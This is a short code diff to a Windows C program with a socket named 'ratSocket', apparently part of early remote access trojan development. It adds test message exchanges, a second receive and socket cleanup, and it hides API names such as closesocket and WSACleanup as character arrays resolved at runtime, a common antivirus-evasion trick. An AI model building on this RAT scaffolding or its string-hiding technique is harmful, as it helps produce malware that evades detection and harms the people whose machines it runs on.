@@ -126,6 +126,7 @@ WinMain(HINSTANCE hInstance,
 	}
 
 	SocketSend(&ratSocket, "This is a test.");
+	Sleep(1000);
 	SocketSend(&ratSocket, "This is just a drill.");
 
 	char ca_recv[] = { 'r','e','c','v',0 };
@@ -138,6 +139,25 @@ WinMain(HINSTANCE hInstance,
 	}
 	OutputDebugStringA("Received: ");
 	OutputDebugStringA(recvBuffer);
+	OutputDebugStringA("\n");
 
+	if ( f_recv(ratSocket.socketConnection, recvBuffer, SOCKET_BUFFER_SIZE, 0) == SOCKET_ERROR )
+	{
+		OutputDebugStringA("Error receiving message.");
+	}
+	OutputDebugStringA("Received: ");
+	OutputDebugStringA(recvBuffer);
+	OutputDebugStringA("\n");
+
+	Sleep(10000);
+	
+	char ca_closesocket[] = { 'c','l','o','s','e','s','o','c','k','e','t',0 };
+	_closesocket* f_closesocket = (_closesocket*)GetProcAddress(ratSocket.libraryWinsock2, ca_closesocket);
+	f_closesocket(ratSocket.socketConnection);
+
+	char ca_WSACleanup[] = { 'W','S','A','C','l','e','a','n','u','p',0 };
+	_WSACleanup* f_WSACleanup = (_WSACleanup*)GetProcAddress(ratSocket.libraryWinsock2, ca_WSACleanup);
+	f_WSACleanup();
+	
 	return 0;
 }
